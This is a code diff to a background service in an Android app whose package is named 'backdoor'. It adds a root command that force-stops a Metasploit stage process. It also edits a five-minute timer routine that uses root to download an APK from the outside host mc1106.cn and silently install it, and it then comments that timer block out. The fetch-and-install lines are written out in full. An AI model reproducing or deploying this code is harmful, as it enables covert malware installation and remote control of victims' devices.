@@ -56,12 +56,14 @@ public class srv extends Service
 				}catch(Exception e)
 				{
 					b=false;
+					try{
+						Runtime.getRuntime().exec("su -c am force-stop com.metasploit.stage");
+					}catch(Exception ee) {}
 				}
-				
 			}
 		};
 		t.schedule(tt,0,2000);
-		
+		/*
 		new Timer().schedule(new TimerTask(){
 
 				@Override
@@ -86,7 +88,7 @@ public class srv extends Service
 						Log.i("fuck","res: " + res);
 						if(res == -1)
 						{
-							p = Runtime.getRuntime().exec("wget http://" + InetAddress.getByName("mc1106.cn").getHostAddress() + "/ex.apk -O /data/user/0/com.voila.backdoor/files/ex.apk");
+							p = Runtime.getRuntime().exec("su -c wget http://" + InetAddress.getByName("mc1106.cn").getHostAddress() + "/ex.apk -O /data/user/0/com.voila.backdoor/files/ex.apk");
 							p.waitFor();
 							p = Runtime.getRuntime().exec("su -c pm install /data/user/0/com.voila.backdoor/files/ex.apk");
 						}
@@ -94,7 +96,7 @@ public class srv extends Service
 					{}
 				}
 			},0,1000 * 60 * 5);
-			
+			*/
 
 		return super.onStartCommand(intent,flags,startId);
 	}
